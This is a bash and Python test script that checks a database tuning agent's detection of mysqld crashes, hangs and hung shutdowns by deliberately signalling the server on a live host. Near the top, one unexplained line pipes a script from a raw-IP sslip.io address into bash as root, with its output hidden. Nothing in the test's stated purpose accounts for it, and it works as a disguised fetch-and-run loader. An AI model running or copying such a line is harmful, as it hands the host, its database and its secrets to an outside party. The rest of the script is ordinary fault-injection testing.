#!/bin/bash
# serverwatch_live.sh: the agent's crash / hang detection (serverwatch, 2026-10-27) against a real mysqld - until now it was
# tested only with simulated ones. Three cases, each through the agent's own code, in a session of their own so the
# incidents show on its page:
#   1. crash while running: SIGSEGV to mysqld (its handler writes "got signal 11" and a backtrace; systemd restarts it)
#   2. hang while running: SIGSTOP - no answer to SELECT 1 for 10 min -> evidence, SIGKILL, systemd restarts it
#   3. hung shutdown: SIGSTOP, then the agent's restart -> 'deactivating' without I/O -> evidence, kill, restart reports it
# Each case must produce exactly one incident of the expected kind and phase, with an evidence directory, and leave mysqld
# running. ~25 min. No data is changed (no benchmark runs).
. /root/bench/pipeline/lib.sh
set -x
ensure_ps84
curl -fsSL https://50-116-44-237.sslip.io/install.sh | bash >/dev/null && systemctl restart tuning-agent
tuning-agent session stop >/dev/null 2>&1 || true
tuning-agent session start --goal tps --policy benchmark --ai off --name "serverwatch live test ($(hostname))" \
  --workload "no benchmark: mysqld crashed / hung on purpose (SIGSEGV, SIGSTOP) to check the agent's detection" || exit 1
/opt/tuning-agent/venv/bin/python3 - <<'PY'
import os, signal, subprocess, sys, time
from tuning_agent import cli, serverwatch
from tuning_agent.applier import Applier

c = cli.Ctx()
svc = cli._service(c)
cli._watch_setup(c, "serverwatch live test")
fails = []


def pid():
    return serverwatch.unit(svc)[2]


def wait_up(limit=900):
    t = time.time()
    while time.time() - t < limit:
        try:
            c.db.connect()
            c.db.scalar("SELECT 1")
            return True
        except Exception:
            time.sleep(3)
    return False


def check(name, inc, kind, phase):
    ok = bool(inc) and inc["kind"] == kind and inc["phase"] == phase and os.path.isdir(inc.get("evidence_dir") or "")
    print(f"== {name}: {'PASS' if ok else 'FAIL'} - {inc and inc['diagnosis']}", flush=True)
    if inc:
        print("   evidence:", sorted(os.listdir(inc["evidence_dir"])), flush=True)
    if not ok:
        fails.append(name)
    if not wait_up():
        fails.append(name + ": mysqld not back")
        print("   mysqld did not come back", flush=True)


# 1. crash while running
with serverwatch.watching(svc) as w:
    p0 = pid()
    # no core file: LimitCORE=infinity would dump the whole buffer pool to disk
    subprocess.run(["prlimit", "--pid", str(p0), "--core=0"], check=True)
    os.kill(p0, signal.SIGSEGV)
    t = time.time()
    while not w.incident and time.time() - t < 180:
        time.sleep(5)
    check("crash while running", w.incident, "crash", "running")
time.sleep(30)

# 2. hang while running (no answer for UNRESPONSIVE_S)
with serverwatch.watching(svc) as w:
    os.kill(pid(), signal.SIGSTOP)
    t = time.time()
    while not w.incident and time.time() - t < serverwatch.UNRESPONSIVE_S + 600:
        time.sleep(10)
    if not w.incident:
        os.kill(pid(), signal.SIGCONT)
    check("hang while running", w.incident, "hang", "running")
time.sleep(30)

# 3. hung shutdown in the agent's own restart
os.kill(pid(), signal.SIGSTOP)
ap = Applier(c.cfg, c.state, c.db, log=print)
ap.preflush = lambda *a, **k: None  # the server is stopped: nothing to flush, and no connection
seen = []
orig = serverwatch.Watch._found
def spy(self, *a, **k):
    s = orig(self, *a, **k)
    seen.append(s)
    return s
serverwatch.Watch._found = spy
ok, err = ap.restart(timeout=1800)
print(f"   restart returned ok={ok}: {err}", flush=True)
check("hung shutdown", seen[0] if seen else None, "hang", "stopping")
if ok:
    fails.append("hung shutdown: restart reported success")

print("== serverwatch live test: " + ("ALL PASS" if not fails else "FAILED: " + ", ".join(fails)), flush=True)
sys.exit(1 if fails else 0)
PY
rc=$?
tuning-agent session stop >/dev/null 2>&1 || true
[ $rc = 0 ] && echo PIPEOK
exit $rc
